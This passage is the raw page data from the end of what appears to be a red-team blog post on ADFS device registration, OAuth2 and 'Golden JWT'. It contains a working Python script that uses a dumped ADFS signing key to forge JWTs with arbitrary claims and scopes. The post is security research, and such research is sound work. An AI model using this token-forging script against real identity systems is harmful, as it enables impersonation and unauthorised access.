\"AYq-eHNpTwfrqqTw03y4wsIE0GQ\"\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"json"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_210":{"__typename":"Paragraph","id":"6c2350f1b8ff_210","name":"e37a","type":"P","href":null,"layout":null,"metadata":null,"text":"The x5t header value is the thumbprint of the certificate used to sign. Decoding this we see:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":4,"end":7,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*9L7D4gmpAI7aO1BMiY62qQ.png":{"__typename":"ImageMetadata","id":"1*9L7D4gmpAI7aO1BMiY62qQ.png","originalHeight":132,"originalWidth":976,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_211":{"__typename":"Paragraph","id":"6c2350f1b8ff_211","name":"46ad","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*9L7D4gmpAI7aO1BMiY62qQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_212":{"__typename":"Paragraph","id":"6c2350f1b8ff_212","name":"e72d","type":"P","href":null,"layout":null,"metadata":null,"text":"If we look at the signing certificate for our ADFS instance:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*awhpMQx3oejb2ZrcMFD_AQ.png":{"__typename":"ImageMetadata","id":"1*awhpMQx3oejb2ZrcMFD_AQ.png","originalHeight":1044,"originalWidth":1306,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_213":{"__typename":"Paragraph","id":"6c2350f1b8ff_213","name":"d583","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*awhpMQx3oejb2ZrcMFD_AQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_214":{"__typename":"Paragraph","id":"6c2350f1b8ff_214","name":"52a1","type":"P","href":null,"layout":null,"metadata":null,"text":"This means that the same certificate we’ve been dumping for Golden SAML is also used for JWT signing, which makes life easier for us as the tooling and techniques for dumping this is already available here.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":201,"end":205,"href":"https:\u002F\u002Faadinternals.com\u002Fpost\u002Fadfs\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_215":{"__typename":"Paragraph","id":"6c2350f1b8ff_215","name":"d1c1","type":"P","href":null,"layout":null,"metadata":null,"text":"If we use the private key, we can craft a simple Python script to generate a new JWT with any claims we want:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_216":{"__typename":"Paragraph","id":"6c2350f1b8ff_216","name":"6dd0","type":"PRE","href":null,"layout":null,"metadata":null,"text":"import jwt\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.asymmetric import padding\nfrom cryptography.x509 import load_pem_x509_certificate\nimport base64\nimport sys\nimport json\nimport hashlib\nimport time\n\ndef generate_kid(cert):\n    public_key = cert.public_key().public_bytes(\n        serialization.Encoding.PEM,\n        serialization.PublicFormat.SubjectPublicKeyInfo\n    )\n    return base64.urlsafe_b64encode(hashlib.sha1(public_key).digest()).decode(\"utf-8\").rstrip(\"=\")\n\ndef spoof_jwt(claims, private_key, public_key, include_timestamp=True):\n\n    kid = generate_kid(public_key)\n\n    header = {\n        \"alg\": \"RS256\",\n        \"x5c\": kid,\n        \"kid\": kid\n    }\n\n    if include_timestamp:\n        claims[\"iat\"] = int(time.time())\n        claims[\"exp\"] = claims[\"iat\"] + 600\n        claims[\"nbf\"] = claims[\"iat\"] - 60\n\n    token = jwt.encode(claims, private_key, algorithm=\"RS256\", headers=header)\n    return token\n\nif __name__ == \"__main__\":\n\n    if len(sys.argv) \u003C 4:\n        print(\"Usage: python3 spoof.py \u003Cprivate_key_path\u003E \u003Ccert_path\u003E \u003Cclaims_path\u003E\")\n        sys.exit(1)\n\n    # Load your RSA private key\n    with open(sys.argv[1], \"rb\") as key_file:\n        private_key = serialization.load_pem_private_key(key_file.read(), password=None)\n\n    with open(sys.argv[2], \"rb\") as cert_file:\n        cert = load_pem_x509_certificate(cert_file.read())\n\n    with open(sys.argv[3], \"r\") as claims_file:\n        claims = json.load(claims_file)\n\n    token = spoof_jwt(claims, private_key, cert)\n    print(token)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"python"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_217":{"__typename":"Paragraph","id":"6c2350f1b8ff_217","name":"a483","type":"P","href":null,"layout":null,"metadata":null,"text":"And again we can replace the generated access token delivered to ClaimsXRay and see that we can add any claims or scopes that we want:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*55Es9EqPf_keNmBSWPlPUQ.png":{"__typename":"ImageMetadata","id":"1*55Es9EqPf_keNmBSWPlPUQ.png","originalHeight":535,"originalWidth":756,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_218":{"__typename":"Paragraph","id":"6c2350f1b8ff_218","name":"de51","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*55Es9EqPf_keNmBSWPlPUQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_219":{"__typename":"Paragraph","id":"6c2350f1b8ff_219","name":"26af","type":"H3","href":null,"layout":null,"metadata":null,"text":"Conclusion","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_220":{"__typename":"Paragraph","id":"6c2350f1b8ff_220","name":"0dd8","type":"P","href":null,"layout":null,"metadata":null,"text":"So there we have it, a brain dump of ADFS OAuth2, DRS, Device Authentication, Device Writeback and some Golden JWT. Some useful bits, and some less useful (but equally interesting) bits.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_221":{"__typename":"Paragraph","id":"6c2350f1b8ff_221","name":"9128","type":"P","href":null,"layout":null,"metadata":null,"text":"If you’re the one Googling for a UUID having just stumbled across your clients ADFS deployment, hopefully this post provides something to make your life a bit easier.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_222":{"__typename":"Paragraph","id":"6c2350f1b8ff_222","name":"7108","type":"P","href":null,"layout":null,"metadata":null,"text":"And if that’s the case, give me a shout and share the story!","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_223":{"__typename":"Paragraph","id":"6c2350f1b8ff_223","name":"8d4f","type":"H3","href":null,"layout":null,"metadata":null,"text":"References & Thanks","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_224":{"__typename":"Paragraph","id":"6c2350f1b8ff_224","name":"b7d1","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Deep-dive to Azure AD device join — https:\u002F\u002Faadinternals.com\u002Fpost\u002Fdevices\u002F","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":36,"end":74,"href":"https:\u002F\u002Faadinternals.com\u002Fpost\u002Fdevices\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_225":{"__typename":"Paragraph","id":"6c2350f1b8ff_225","name":"d4d5","type":"ULI","href":null,"layout":null,"metadata":null,"text":"RoadTools — https:\u002F\u002Fgithub.com\u002Fdirkjanm\u002FROADtools","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":12,"end":49,"href":"https:\u002F\u002Fgithub.com\u002Fdirkjanm\u002FROADtools","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_226":{"__typename":"Paragraph","id":"6c2350f1b8ff_226","name":"1eb8","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Further Digging into the Primary Refresh Token — https:\u002F\u002Fdirkjanm.io\u002Fdigging-further-into-the-primary-refresh-token\u002F","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":49,"end":116,"href":"https:\u002F\u002Fdirkjanm.io\u002Fdigging-further-into-the-primary-refresh-token\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"CollectionViewerEdge:collectionId:f05f8696e3cc-viewerId:lo_d134ff824f72":{"__typename":"CollectionViewerEdge","id":"collectionId:f05f8696e3cc-viewerId:lo_d134ff824f72","isEditor":false,"isMuting":false},"UserViewerEdge:userId:94749d3f8afc-viewerId:lo_d134ff824f72":{"__typename":"UserViewerEdge","id":"userId:94749d3f8afc-viewerId:lo_d134ff824f72","isMuting":false},"ImageMetadata:1*s-5BWBr8XsgtIU5azKNhZQ.jpeg":{"__typename":"ImageMetadata","id":"1*s-5BWBr8XsgtIU5azKNhZQ.jpeg","originalWidth":2000,"originalHeight":805},"PostViewerEdge:postId:c11f9b371811-viewerId:lo_d134ff824f72":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:c11f9b371811-viewerId:lo_d134ff824f72"},"Tag:adfs":{"__typename":"Tag","id":"adfs","displayTitle":"Adfs","normalizedTagSlug":"adf"},"Tag:oauth2":{"__typename":"Tag","id":"oauth2","displayTitle":"Oauth2","normalizedTagSlug":"oauth2"},"Tag:phishing":{"__typename":"Tag","id":"phishing","displayTitle":"Phishing","normalizedTagSlug":"phishing"},"Tag:red-team":{"__typename":"Tag","id":"red-team","displayTitle":"Red Team","normalizedTagSlug":"red-team"},"Post:c11f9b371811":{"__typename":"Post","id":"c11f9b371811","collection":{"__ref":"Collection:f05f8696e3cc"},"content({\"postMeteringOptions\":{}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"5f4e","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:6c2350f1b8ff_0"},{"__ref":"Paragraph:6c2350f1b8ff_1"},{"__ref":"Paragraph:6c2350f1b8ff_2"},{"__ref":"Paragraph:6c2350f1b8ff_3"},{"__ref":"Paragraph:6c2350f1b8ff_4"},{"__ref":"Paragraph:6c2350f1b8ff_5"},{"__ref":"Paragraph:6c2350f1b8ff_6"},{"__ref":"Paragraph:6c2350f1b8ff_7"},{"__ref":"Paragraph:6c2350f1b8ff_8"},{"__ref":"Paragraph:6c2350f1b8ff_9"},{"__ref":"Paragraph:6c2350f1b8ff_10"},{"__ref":"Paragraph:6c2350f1b8ff_11"},{"__ref":"Paragraph:6c2350f1b8ff_12"},{"__ref":"Paragraph:6c2350f1b8ff_13"},{"__ref":"Paragraph:6c2350f1b8ff_14"},{"__ref":"Paragraph:6c2350f1b8ff_15"},{"__ref":"Paragraph:6c2350f1b8ff_16"},{"__ref":"Paragraph:6c2350f1b8ff_17"},{"__ref":"Paragraph:6c2350f1b8ff_18"},{"__ref":"Paragraph:6c2350f1b8ff_19"},{"__ref":"Paragraph:6c2350f1b8ff_20"},{"__ref":"Paragraph:6c2350f1b8ff_21"},{"__ref":"Paragraph:6c2350f1b8ff_22"},{"__ref":"Paragraph:6c2350f1b8ff_23"},{"__ref":"Paragraph:6c2350f1b8ff_24"},{"__ref":"Paragraph:6c2350f1b8ff_25"},{"__ref":"Paragraph:6c2350f1b8ff_26"},{"__ref":"Paragraph:6c2350f1b8ff_27"},{"__ref":"Paragraph:6c2350f1b8ff_28"},{"__ref":"Paragraph:6c2350f1b8ff_29"},{"__ref":"Paragraph:6c2350f1b8ff_30"},{"__ref":"Paragraph:6c2350f1b8ff_31"},{"__ref":"Paragraph:6c2350f1b8ff_32"},{"__ref":"Paragraph:6c2350f1b8ff_33"},{"__ref":"Paragraph:6c2350f1b8ff_34"},{"__ref":"Paragraph:6c2350f1b8ff_35"},{"__ref":"Paragraph:6c2350f1b8ff_36"},{"__ref":"Paragraph:6c2350f1b8ff_37"},{"__ref":"Paragraph:6c2350f1b8ff_38"},{"__ref":"Paragraph:6c2350f1b8ff_39"},{"__ref":"Paragraph:6c2350f1b8ff_40"},{"__ref":"Paragraph:6c2350f1b8ff_41"},{"__ref":"Paragraph:6c2350f1b8ff_42"},{"__ref":"Paragraph:6c2350f1b8ff_43"},{"__ref":"Paragraph:6c2350f1b8ff_44"},{"__ref":"Paragraph:6c2350f1b8ff_45"},{"__ref":"Paragraph:6c2350f1b8ff_46"},{"__ref":"Paragraph:6c2350f1b8ff_47"},{"__ref":"Paragraph:6c2350f1b8ff_48"},{"__ref":"Paragraph:6c2350f1b8ff_49"},{"__ref":"Paragraph:6c2350f1b8ff_50"},{"__ref":"Paragraph:6c2350f1b8ff_51"},{"__ref":"Paragraph:6c2350f1b8ff_52"},{"__ref":"Paragraph:6c2350f1b8ff_53"},{"__ref":"Paragraph:6c2350f1b8ff_54"},{"__ref":"Paragraph:6c2350f1b8ff_55"},{"__ref":"Paragraph:6c2350f1b8ff_56"},{"__ref":"Paragraph:6c2350f1b8ff_57"},{"__ref":"Paragraph:6c2350f1b8ff_58"},{"__ref":"Paragraph:6c2350f1b8ff_59"},{"__ref":"Paragraph:6c2350f1b8ff_60"},{"__ref":"Paragraph:6c2350f1b8ff_61"},{"__ref":"Paragraph:6c2350f1b8ff_62"},{"__ref":"Paragraph:6c2350f1b8ff_63"},{"__ref":"Paragraph:6c2350f1b8ff_64"},{"__ref":"Paragraph:6c2350f1b8ff_65"},{"__ref":"Paragraph:6c2350f1b8ff_66"},{"__ref":"Paragraph:6c2350f1b8ff_67"},{"__ref":"Paragraph:6c2350f1b8ff_68"},{"__ref":"Paragraph:6c2350f1b8ff_69"},{"__ref":"Paragraph:6c2350f1b8ff_70"},{"__ref":"Paragraph:6c2350f1b8ff_71"},{"__ref":"Paragraph:6c2350f1b8ff_72"},{"__ref":"Paragraph:6c2350f1b8ff_73"},{"__ref":"Paragraph:6c2350f1b8ff_74"},{"__ref":"Paragraph:6c2350f1b8ff_75"},{"__ref":"Paragraph:6c2350f1b8ff_76"},{"__ref":"Paragraph:6c2350f1b8ff_77"},{"__ref":"Paragraph:6c2350f1b8ff_78"},{"__ref":"Paragraph:6c2350f1b8ff_79"},{"__ref":"Paragraph:6c2350f1b8ff_80"},{"__ref":"Paragraph:6c2350f1b8ff_81"},{"__ref":"Paragraph:6c2350f1b8ff_82"},{"__ref":"Paragraph:6c2350f1b8ff_83"},{"__ref":"Paragraph:6c2350f1b8ff_84"},{"__ref":"Paragraph:6c2350f1b8ff_85"},{"__ref":"Paragraph:6c2350f1b8ff_86"},{"__ref":"Paragraph:6c2350f1b8ff_87"},{"__ref":"Paragraph:6c2350f1b8ff_88"},{"__ref":"Paragraph:6c2350f1b8ff_89"},{"__ref":"Paragraph:6c2350f1b8ff_90"},{"__ref":"Paragraph:6c2350f1b8ff_91"},{"__ref":"Paragraph:6c2350f1b8ff_92"},{"__ref":"Paragraph:6c2350f1b8ff_93"},{"__ref":"Paragraph:6c2350f1b8ff_94"},{"__ref":"Paragraph:6c2350f1b8ff_95"},{"__ref":"Paragraph:6c2350f1b8ff_96"},{"__ref":"Paragraph:6c2350f1b8ff_97"},{"__ref":"Paragraph:6c2350f1b8ff_98"},{"__ref":"Paragraph:6c2350f1b8ff_99"},{"__ref":"Paragraph:6c2350f1b8ff_100"},{"__ref":"Paragraph:6c2350f1b8ff_101"},{"__ref":"Paragraph:6c2350f1b8ff_102"},{"__ref":"Paragraph:6c2350f1b8ff_103"},{"__ref":"Paragraph:6c2350f1b8ff_104"},{"__ref":"Paragraph:6c2350f1b8ff_105"},{"__ref":"Paragraph:6c2350f1b8ff_106"},{"__ref":"Paragraph:6c2350f1b8ff_107"},{"__ref":"Paragraph:6c2350f1b8ff_108"},{"__ref":"Paragraph:6c2350f1b8ff_109"},{"__ref":"Paragraph:6c2350f1b8ff_110"},{"__ref":"Paragraph:6c2350f1b8ff_111"},{"__ref":"Paragraph:6c2350f1b8ff_112"},{"__ref":"Paragraph:6c2350f1b8ff_113"},{"__ref":"Paragraph:6c2350f1b8ff_114"},{"__ref":"Paragraph:6c2350f1b8ff_115"},{"__ref":"Paragraph:6c2350f1b8ff_116"},{"__ref":"Paragraph:6c2350f1b8ff_117"},{"__ref":"Paragraph:6c2350f1b8ff_118"},{"__ref":"Paragraph:6c2350f1b8ff_119"},{"__ref":"Paragraph:6c2350f1b8ff_120"},{"__ref":"Paragraph:6c2350f1b8ff_121"},{"__ref":"Paragraph:6c2350f1b8ff_122"},{"__ref":"Paragraph:6c2350f1b8ff_123"},{"__ref":"Paragraph:6c2350f1b8ff_124"},{"__ref":"Paragraph:6c2350f1b8ff_125"},{"__ref":"Paragraph:6c2350f1b8ff_126"},{"__ref":"Paragraph:6c2350f1b8ff_127"},{"__ref":"Paragraph:6c2350f1b8ff_128"},{"__ref":"Paragraph:6c2350f1b8ff_129"},{"__ref":"Paragraph:6c2350f1b8ff_130"},{"__ref":"Paragraph:6c2350f1b8ff_131"},{"__ref":"Paragraph:6c2350f1b8ff_132"},{"__ref":"Paragraph:6c2350f1b8ff_133"},{"__ref":"Paragraph:6c2350f1b8ff_134"},{"__ref":"Paragraph:6c2350f1b8ff_135"},{"__ref":"Paragraph:6c2350f1b8ff_136"},{"__ref":"Paragraph:6c2350f1b8ff_137"},{"__ref":"Paragraph:6c2350f1b8ff_138"},{"__ref":"Paragraph:6c2350f1b8ff_139"},{"__ref":"Paragraph:6c2350f1b8ff_140"},{"__ref":"Paragraph:6c2350f1b8ff_141"},{"__ref":"Paragraph:6c2350f1b8ff_142"},{"__ref":"Paragraph:6c2350f1b8ff_143"},{"__ref":"Paragraph:6c2350f1b8ff_144"},{"__ref":"Paragraph:6c2350f1b8ff_145"},{"__ref":"Paragraph:6c2350f1b8ff_146"},{"__ref":"Paragraph:6c2350f1b8ff_147"},{"__ref":"Paragraph:6c2350f1b8ff_148"},{"__ref":"Paragraph:6c2350f1b8ff_149"},{"__ref":"Paragraph:6c2350f1b8ff_150"},{"__ref":"Paragraph:6c2350f1b8ff_151"},{"__ref":"Paragraph:6c2350f1b8ff_152"},{"__ref":"Paragraph:6c2350f1b8ff_153"},{"__ref":"Paragraph:6c2350f1b8ff_154"},{"__ref":"Paragraph:6c2350f1b8ff_155"},{"__ref":"Paragraph:6c2350f1b8ff_156"},{"__ref":"Paragraph:6c2350f1b8ff_157"},{"__ref":"Paragraph:6c2350f1b8ff_158"},{"__ref":"Paragraph:6c2350f1b8ff_159"},{"__ref":"Paragraph:6c2350f1b8ff_160"},{"__ref":"Paragraph:6c2350f1b8ff_161"},{"__ref":"Paragraph:6c2350f1b8ff_162"},{"__ref":"Paragraph:6c2350f1b8ff_163"},{"__ref":"Paragraph:6c2350f1b8ff_164"},{"__ref":"Paragraph:6c2350f1b8ff_165"},{"__ref":"Paragraph:6c2350f1b8ff_166"},{"__ref":"Paragraph:6c2350f1b8ff_167"},{"__ref":"Paragraph:6c2350f1b8ff_168"},{"__ref":"Paragraph:6c2350f1b8ff_169"},{"__ref":"Paragraph:6c2350f1b8ff_170"},{"__ref":"Paragraph:6c2350f1b8ff_171"},{"__ref":"Paragraph:6c2350f1b8ff_172"},{"__ref":"Paragraph:6c2350f1b8ff_173"},{"__ref":"Paragraph:6c2350f1b8ff_174"},{"__ref":"Paragraph:6c2350f1b8ff_175"},{"__ref":"Paragraph:6c2350f1b8ff_176"},{"__ref":"Paragraph:6c2350f1b8ff_177"},{"__ref":"Paragraph:6c2350f1b8ff_178"},{"__ref":"Paragraph:6c2350f1b8ff_179"},{"__ref":"Paragraph:6c2350f1b8ff_180"},{"__ref":"Paragraph:6c2350f1b8ff_181"},{"__ref":"Paragraph:6c2350f1b8ff_182"},{"__ref":"Paragraph:6c2350f1b8ff_183"},{"__ref":"Paragraph:6c2350f1b8ff_184"},{"__ref":"Paragraph:6c2350f1b8ff_185"},{"__ref":"Paragraph:6c2350f1b8ff_186"},{"__ref":"Paragraph:6c2350f1b8ff_187"},{"__ref":"Paragraph:6c2350f1b8ff_188"},{"__ref":"Paragraph:6c2350f1b8ff_189"},{"__ref":"Paragraph:6c2350f1b8ff_190"},{"__ref":"Paragraph:6c2350f1b8ff_191"},{"__ref":"Paragraph:6c2350f1b8ff_192"},{"__ref":"Paragraph:6c2350f1b8ff_193"},{"__ref":"Paragraph:6c2350f1b8ff_194"},{"__ref":"Paragraph:6c2350f1b8ff_195"},{"__ref":"Paragraph:6c2350f1b8ff_196"},{"__ref":"Paragraph:6c2350f1b8ff_197"},{"__ref":"Paragraph:6c2350f1b8ff_198"},{"__ref":"Paragraph:6c2350f1b8ff_199"},{"__ref":"Paragraph:6c2350f1b8ff_200"},{"__ref":"Paragraph:6c2350f1b8ff_201"},{"__ref":"Paragraph:6c2350f1b8ff_202"},{"__ref":"Paragraph:6c2350f1b8ff_203"},{"__ref":"Paragraph:6c2350f1b8ff_204"},{"__ref":"Paragraph:6c2350f1b8ff_205"},{"__ref":"Paragraph:6c2350f1b8ff_206"},{"__ref":"Paragraph:6c2350f1b8ff_207"},{"__ref":"Paragraph:6c2350f1b8ff_208"},{"__ref":"Paragraph:6c2350f1b8ff_209"},{"__ref":"Paragraph:6c2350f1b8ff_210"},{"__ref":"Paragraph:6c2350f1b8ff_211"},{"__ref":"Paragraph:6c2350f1b8ff_212"},{"__ref":"Paragraph:6c2350f1b8ff_213"},{"__ref":"Paragraph:6c2350f1b8ff_214"},{"__ref":"Paragraph:6c2350f1b8ff_215"},{"__ref":"Paragraph:6c2350f1b8ff_216"},{"__ref":"Paragraph:6c2350f1b8ff_217"},{"__ref":"Paragraph:6c2350f1b8ff_218"},{"__ref":"Paragraph:6c2350f1b8ff_219"},{"__ref":"Paragraph:6c2350f1b8ff_220"},{"__ref":"Paragraph:6c2350f1b8ff_221"},{"__ref":"Paragraph:6c2350f1b8ff_222"},{"__ref":"Paragraph:6c2350f1b8ff_223"},{"__ref":"Paragraph:6c2350f1b8ff_224"},{"__ref":"Paragraph:6c2350f1b8ff_225"},{"__ref":"Paragraph:6c2350f1b8ff_226"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:94749d3f8afc"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fposts.specterops.io\u002Fadfs-living-in-the-legacy-of-drs-c11f9b371811","primaryTopic":null,"topics":[],"isPublished":true,"latestPublishedVersion":"6c2350f1b8ff","visibility":"PUBLIC","postResponses":{"__typename":"PostResponses","count":0},"clapCount":8,"allowResponses":true,"isLimitedState":false,"title":"ADFS — Living in the Legacy of DRS","isSeries":false,"sequence":null,"uniqueSlug":"adfs-living-in-the-legacy-of-drs-c11f9b371811","socialTitle":"","socialDek":"","canonicalUrl":"","metaDescription":"","latestPublishedAt":1736258252894,"readingTime":21.030188679245285,"previewContent":{"__typename":"PreviewContent","subtitle":"It’s no secret that Microsoft have been trying to move customers away from ADFS for a while. Short of slapping a “deprecated” label on it…"},"previewImage":{"__ref":"ImageMetadata:1*31CEmkS9GO7ULoQSgVlnyg.png"},"isShortform":false,"seoTitle":"","firstPublishedAt":1736258252894,"updatedAt":1736260417877,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","viewerEdge":{"__ref":"PostViewerEdge:postId:c11f9b371811-viewerId:lo_d134ff824f72"},"isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:adfs"},{"__ref":"Tag:oauth2"},{"__ref":"Tag:phishing"},{"__ref":"Tag:red-team"}],"isNewsletter":false,"statusForCollection":"APPROVED","pendingCollection":null,"detectedLanguage":"en","wordCount":4884,"layerCake":0,"responsesLocked":false}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.1b75cd39.js"></script><script src="https://cdn-client.medium.com/lite/static/js/9865.1496d74a.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.bc924586.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.d9108df7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.ff22a7a5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9120.5df29668.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5049.d1ead72d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4810.6318add7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6618.db187378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2707.a4e221ac.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9977.933c1c9a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8599.73cb8339.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5250.9f9e01d2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8346.be5bef41.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2648.26563adf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8393.826a25fb.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4863.28ab43f6.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6589.ab860fa4.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5642.0f82ef97.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6546.7c45541d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.8aa8d357.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4492.3e85e9f5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/839.1c286b32.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3259.1779fbde.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.60bcefe8.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7394.ca29bb88.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5794.9e8ff5dd.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8204.e2639348.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4391.59acaed3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.111f755f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8414.6565ad5f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3974.8d3e0217.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2527.21406717.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostResponsesContent.0eb77899.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/responses.editor.5a11f4da.chunk.js"></script><script>window.main();</script></body></html>